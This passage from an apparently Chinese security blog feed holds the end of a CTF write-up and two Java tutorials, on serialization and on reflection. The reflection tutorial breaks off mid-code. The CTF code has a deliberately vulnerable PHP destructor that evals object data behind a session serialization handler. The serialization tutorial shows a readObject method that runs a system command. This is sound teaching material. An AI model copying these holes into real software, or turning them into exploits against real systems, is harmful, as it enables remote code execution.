punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome To Eva Word~"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloEva</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># Look Look session.php?</span><span class="token delimiter important">?></span></span></code></pre><p>session.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>：设置会话序列化处理器为’php_serialize’，这意味着会话数据将使用PHP的序列化机制进行存储。</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 御宛杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA安全基础-- 序列化与反序列化</title>
      <link href="/2024/09/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-3/"/>
      <url>/2024/09/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-3/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><ul><li>什么是序列化与反序列化？</li><li>序列化与反序列化的关键函数？</li><li>反序列化过后的数据有啥特征?</li><li>java反序列化漏洞与php反序列化漏洞的相似之处?</li></ul><p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">Java-序列化和反序列化</a></p><p><a href="https://www.javasec.org/javase/JavaDeserialization/Serialization.html">Java序列化和反序列化</a></p><p>其实java反序列化漏洞的原理很简单，只是各个POP链比较复杂。</p><h3 id="0x02-概念"><a href="#0x02-概念" class="headerlink" title="0x02 概念"></a>0x02 概念</h3><p>我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</p><p> 当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p><p>① 想把内存中的对象保存到一个文件中或者数据库中时候；<br>② 想用套接字在网络上传送对象的时候；<br>③ 想通过RMI传输对象的时候</p><p>一些应用场景，涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p><p>简单来讲，Java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。</p><p>序列化：把对象转换为字节序列<br>反序列化：把字节序列转换为对象</p><h3 id="0x03-示例讲解"><a href="#0x03-示例讲解" class="headerlink" title="0x03 示例讲解"></a>0x03 示例讲解</h3><p>一个类对象要想实现序列化，必须满足两个条件：</p><p>1、该类必须实现 java.io.Serializable 对象。</p><p>2、该类的所有属性必须是可序列化的。<del>如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</del></p><p>要序列化一个对象，首先要创建OutputStream对象，再将其封装在一个ObjectOutputStream对象内，接着只需调用writeObject()即可将对象序列化，并将其发送给OutputStream（对象是基于字节的，因此要使用InputStream和OutputStream来继承层次结构）。</p><p>要反序列化出一个对象，需要将一个InputStream封装在ObjectInputStream内，然后调用readObject()即可。</p><p>看文字不够直观，咱们直接上代码（注意看注释）：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> user_ser<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"hsad"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 创建一个FIleOutputStream</span>            <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"./user.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 将这个FIleOutputStream封装到ObjectOutputStream中</span>            <span class="token class-name">ObjectOutputStream</span> os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 调用writeObject方法，序列化对象到文件user.ser中</span>            os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"读取数据："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//  创建一个FIleInutputStream</span>            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"./user.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 将FileInputStream封装到ObjectInputStream中</span>            <span class="token class-name">ObjectInputStream</span> oi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 调用readObject从user.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型</span>            <span class="token class-name">User</span> user1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span>oi<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            user1<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">,</span> <span class="token keyword">float</span> height<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Name: "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">", Age: "</span><span class="token operator">+</span>age<span class="token operator">+</span><span class="token string">", Height: "</span><span class="token operator">+</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//     private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException&#123;</span><span class="token comment">//         System.out.println("[*]执行了自定义的readObject函数");</span><span class="token comment">//         Runtime.getRuntime().exec("calc");</span><span class="token comment">//     &#125;</span><span class="token punctuation">&#125;</span></code></pre><p>程序执行过后会在当前目录下生成一个user.ser文件，并且反序列化过后会执行info方法，在终端上打印出User的信息：</p><p><img src="1.png" loading="lazy"></p><p>可以看到按照预期执行了，成功生成了一个user.ser文件，这个文件里存放的就是反序列化过后的User类对象，我们用010看一下内容。这里需要注意的特征值就是16进制显示时的前32位：</p><p><img src="2.png" loading="lazy"></p><p>AC ED：STREAM_MAGIC，声明使用了序列化协议，<strong>从这里可以判断保存的内容是否为序列化数据。</strong> （这是在黑盒挖掘反序列化漏洞很重要的一个点）</p><p>00 05：STREAM_VERSION，序列化协议版本。</p><h3 id="0x04-反序列化漏洞利用点"><a href="#0x04-反序列化漏洞利用点" class="headerlink" title="0x04 反序列化漏洞利用点"></a>0x04 反序列化漏洞利用点</h3><p>上面已经说完了序列化的基础了，大家也应该知道如何实现一个对象的序列化与反序列化了，那么，漏洞点到底在哪里呢?如果你了解php的反序列化，那么应该知道php反序列化一个对象时会自动触发<code>__weakup</code>、<code>__destruct</code>这些函数，如果这些函数当中有一些危险的操作，那么就可能导致漏洞的发生，同样的，java反序列化时会自动触发readObject()函数,但是上面demo中的readObject()函数不是ObjectInputStream的方法吗，开发者又不可以控制，怎么会导致漏洞呢？</p><p>其实，java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。试验一下：我们还是用上面的类，不过这次自定义User类的readObject方法，也就是去掉最后一点代码的注释，再次执行，查看结果：</p><p><img src="3.png" loading="lazy"></p><p>可以看到，自定义的readObject的确执行了！</p><p>现在，我们在readObject中写上危险操作，比如执行系统命令，弹个calc:</p><p><img src="4.png" loading="lazy"></p><p>其实如果细心观察会发现，再自定义readobject函数后，原本的对象信息并没有被正确打印，因为在Java中，当你自定义<code>readObject</code>方法时，你实际上是在覆盖默认的反序列化行为。默认情况下，<code>ObjectInputStream</code>会使用反射来恢复对象的状态。但是，如果你提供了一个自定义的<code>readObject</code>方法，那么你需要自己处理对象状态的恢复，包括字段的赋值。</p><p>在<code>User</code>类中，自定义的<code>readObject</code>方法并没有调用默认的<code>readObject</code>来恢复对象的非瞬态字段（<code>name</code>, <code>age</code>, <code>height</code>），而是执行了一个外部命令<code>calc</code>。因此，对象的字段并没有被正确地从流中读取和赋值，导致了字段值为默认值，对于对象引用类型（如<code>String</code>），默认值是<code>null</code>。</p><h3 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h3><p>以上只是对Java反序列化的一个小Demo，事实上才刚刚开始，之后当然有更详细的学习</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA安全基础-- 反射机制</title>
      <link href="/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-2/"/>
      <url>/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-2/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-反射概念"><a href="#0x01-反射概念" class="headerlink" title="0x01 反射概念"></a>0x01 反射概念</h3><p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法&#x2F;访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><h3 id="0x02-编译机制"><a href="#0x02-编译机制" class="headerlink" title="0x02 编译机制"></a>0x02 编译机制</h3><p>静态编译：在编译时确定好类型，绑定对象。</p><p>动态编译：在运行时确定类型，绑定对象。</p><h3 id="0x03-优点"><a href="#0x03-优点" class="headerlink" title="0x03 优点"></a>0x03 优点</h3><p>反射：将类的各个组成部分封装为其他对象，这就是反射机制。</p><p>1、可以在程序运行过程中，操作这些对象。</p><p>2、可以解耦，提高程序的可扩展性。</p><h3 id="0x04-示例讲解"><a href="#0x04-示例讲解" class="headerlink" title="0x04 示例讲解"></a>0x04 示例讲解</h3><p>反射机制可以动态创建对象和编译，体现很大的灵活性。在一个大型系统发布时，如果以后需要更新某些功能的时候，不可能让用户将之前的游戏卸载掉，重新安装新的版本。采取静态编译的话，需要把整个游戏重新编译一次才能实现功能的更新，而使用反射机制的话，不需要卸载，只需要在运行的时候动态创建和编译即可。</p><h3 id="0x05-java反射机制流程图"><a href="#0x05-java反射机制流程图" class="headerlink" title="0x05 java反射机制流程图"></a>0x05 java反射机制流程图</h3><p><img src="1.png" loading="lazy"></p><p>这里我们使用一个简陋的流程图配合讲述下反射机制基本流程。比如我们创建了一个类文件，经过javac编译之后，就会形成class文件，同时jvm内存会查找生成的class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取成员变量Field，成员方法Method和构造方法Constructor等方法。最后就是我们平时new创建对象。</p><p>这里其实跟我们了解到java运行体系没有很大区别，只是我们生成class文件的时候，也创建了Class对象。而Class是java.lang.Class类中，是所有类的的类。而类是java.lang.Class类的实例对象，所以我们的反射机制本身不复杂，就是获取一个类的Class对象，然后在用Class对象中的获取成员变量Field，成员方法Method和构造方法Constructor等方法，再去动态获取一个类或者调用一个类的属性，变量，构造方法等方式。</p><h3 id="0x06-反射组成相关的类"><a href="#0x06-反射组成相关的类" class="headerlink" title="0x06 反射组成相关的类"></a>0x06 反射组成相关的类</h3><p>反射机制相关操作一般位于java.lang.reflect包中。</p><p><img src="2.png" loading="lazy"></p><p>而java反射机制组成需要重点注意以下的类：</p><p>java.lang.Class：类对象;</p><p>java.lang.reflect.Constructor：类的构造器对象;</p><p>java.lang.reflect.Field：类的属性对象;</p><p>java.lang.reflect.Method：类的方法对象;</p><h3 id="0x07-反射常见使用的方法"><a href="#0x07-反射常见使用的方法" class="headerlink" title="0x07 反射常见使用的方法"></a>0x07 反射常见使用的方法</h3><p>获取类的方法：forname</p><p>实例化类对象的方法：newInstance</p><p>获取函数的方法：getMethod</p><p>执行函数的方法：invoke</p><h3 id="class对象的获取方法"><a href="#class对象的获取方法" class="headerlink" title="class对象的获取方法"></a>class对象的获取方法</h3><p>从上述流程图分析中可以得知，java反射机制的原理基础是理解Class类，在反射中，我们想获取一个类或调用一个类的方法，需要先获取到该类的Class对象。</p><p>对于普通用户我们可以采用以下方法创建实例：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>而我们在创建class类的实例对象却不能使用上述方法，运行会抛出错误</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="3.png" loading="lazy"></p><p>同时我们可以跟进Class类的源码进行查看，发现其构造器是私有的，所以只有JVM能够创建Class对象。</p><p><img src="4.png" loading="lazy"></p><p>因为Class类是private私有属性，我们也无法通过创建对象的方式来获取class对象，那么我们怎样才能够获取到class对象呢？一般我们获取class对象就有以下三种方法，我们来逐一看看。</p><h4 id="1、类的-class属性"><a href="#1、类的-class属性" class="headerlink" title="1、类的.class属性"></a>1、类的.class属性</h4><p>第一种就是最简单明了的方式，我们可以通过类名的属性class获取。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1<span class="token operator">=</span><span class="token class-name">ReflectDemo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span></code></pre><h4 id="2、实例化对象的getClass-方法"><a href="#2、实例化对象的getClass-方法" class="headerlink" title="2、实例化对象的getClass()方法"></a>2、实例化对象的getClass()方法</h4><p>第二种我们可以先实例化一个对象，之后在调用getClass()方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ReflectDemo</span> demo2<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> c2 <span class="token operator">=</span> demo2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="3、Class-forName-String-className-：动态加载类"><a href="#3、Class-forName-String-className-：动态加载类" class="headerlink" title="3、Class.forName(String className)：动态加载类"></a>3、Class.forName(String className)：动态加载类</h4><p>第三种则是调用Class类中的forName方法，将字节码文件加载进内存，返回Class对象。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"reflectdemo.ReflectDemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们可以写个简单的示例代码，分别利用这三种方法获取当前类Class对象的当前类名。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTemo</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 类的.class属性</span>      <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">ReflectTemo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 实例化对象的getClass()方法</span>      <span class="token class-name">ReflectTemo</span> demo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectTemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Class</span> c2 <span class="token operator">=</span> demo<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Class.forName(String className): 动态加载类</span>      <span class="token class-name">Class</span> c3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ReflectTemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c3<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="5.png" loading="lazy"></p><p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p><p>而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误；</p><p>而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。</p><p>所以我们在获取class对象中，一般使用Class.forName方法去获取。</p><h3 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h3><p>获取成员变量Field位于java.lang.reflect.Field包中</p><p>Field[] getFields() ：获取所有public修饰的成员变量</p><p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name) 获取指定名称的 public修饰的成员变量</p><p>Field getDeclaredField(String name) 获取指定的成员变量</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FieldTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> profession<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> number<span class="token punctuation">;</span>    <span class="token keyword">char</span> sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.FieldTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建Class对象</span>            <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fieldArray1 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取全部成员变量</span>            <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fieldArray2 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取全部public成员变量</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fieldArray1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fieldArray2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Field</span> fieldArray3 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取指定名称的public修饰的成员变量</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldArray3<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------分割线---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Field</span> fieldArray4 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取指定的成员变量</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldArray4<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="6.png" loading="lazy"></p><h3 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h3><p>Method getMethod(String name, 类&lt;?&gt;… parameterTypes) &#x2F;&#x2F;返回该类所声明的public方法</p><p>Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes) &#x2F;&#x2F;返回该类所声明的所有方法</p><p>&#x2F;&#x2F;第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</p><p>Method[] getMethods() &#x2F;&#x2F;获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</p><p>Method[] getDeclaredMethods() &#x2F;&#x2F; 获取该类中的所有方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token 